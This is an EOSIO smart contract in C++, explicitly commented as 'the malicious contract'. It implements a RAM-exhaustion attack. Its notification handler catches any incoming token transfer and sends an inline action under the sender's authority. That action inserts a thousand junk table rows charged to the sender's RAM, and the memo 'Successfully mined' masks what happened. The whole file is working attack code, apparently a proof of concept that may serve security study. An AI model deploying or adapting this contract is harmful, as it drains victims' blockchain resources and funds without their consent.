#include <eosio/system.hpp>
#include <eosio/eosio.hpp>
#include <eosio/time.hpp>
#include <eosio/asset.hpp>
using namespace eosio;
// The malicious contract
class [[eosio::contract]] eosram : public contract {

        public:
                using contract::contract;
  
                ///@abi action
                [[eosio::action]]
                void transfer( name from,
                                name to,
                                asset quantity,
                                std::string memo ) // This function has the same signature as 
                                                   // the transfer function from eosio.token, 
                                                   // so it can be invoked with an appropriate 
                                                   // notification during a token transfer.
                {
                        _ttab ttabs(get_self(),get_self().value);
  
                        uint64_t start = eosio::current_time_point().sec_since_epoch() * 1000;
                        for (int i = 0; i < 1000; i++)
                        {
                                ttabs.emplace(from, [&](auto& data){ // The first parameter 
                                            // here specifies the account 
                                            // that would pay for any used RAM. 
                                            // In this case, it is the sender 
                                            // of the transaction.
                                                data.id = start + i;
                                                });// Places junk data into the table
                        }
                }

[[eosio::on_notify("*::transfer")]]
void on_transfer( const name from, const name to, const asset quantity, const std::string memo ) {

    action(
      permission_level{from, "active"_n},
      name(get_self()),
      "transfer"_n, 
      std::make_tuple(from,to,quantity,std::string("Successfully mined: "))
    ).send();

}

                struct ttab
                {
                        uint64_t id;
                        uint64_t primary_key() const {return id;}
                        EOSLIB_SERIALIZE(ttab,(id))
                };
                typedef multi_index< "ttab"_n, ttab > _ttab; // The table that will take up the RAM

};
